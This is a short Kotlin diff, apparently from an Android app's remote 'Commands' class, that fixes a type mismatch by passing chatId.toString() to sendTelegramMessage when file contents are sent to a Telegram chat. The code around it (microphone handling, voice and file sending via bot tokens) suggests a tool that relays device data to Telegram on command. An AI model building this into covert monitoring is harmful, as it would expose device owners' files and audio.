@@ -28,6 +28,7 @@ import kotlin.random.Random
  * - تعديل handleMic لتمرير threadId إلى sendTelegramVoice.
  * - ✅ إصلاح خطأ Type mismatch في sendTelegramMessage: تغيير chatId إلى Any وتحويله إلى String داخلياً.
  * - ✅ تحويل جميع استدعاءات sendTelegramMessage التي تستخدم cid إلى cid.toString() لضمان التوافق.
+ * - ✅ التأكد من أن جميع استدعاءات sendTelegramMessage في sendTextFile تستخدم chatId.toString().
  */
 class Commands private constructor(context: Context) {
 
@@ -447,7 +448,7 @@ class Commands private constructor(context: Context) {
     ) {
         if (content.isBlank()) {
             sendTelegramMessage(
-                tg, chatId, "📄 $filename: لا يوجد محتوى",
+                tg, chatId.toString(), "📄 $filename: لا يوجد محتوى",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -462,7 +463,7 @@ class Commands private constructor(context: Context) {
             if (tempFile.length() == 0L) {
                 safeRemove(tempFile)
                 sendTelegramMessage(
-                    tg, chatId, "📄 $filename: ملف فارغ",
+                    tg, chatId.toString(), "📄 $filename: ملف فارغ",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -480,7 +481,7 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Send text file error: ${e.message}")
             sendTelegramMessage(
-                tg, chatId, "📄 $filename:\n${content.take(4000)}",
+                tg, chatId.toString(), "📄 $filename:\n${content.take(4000)}",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
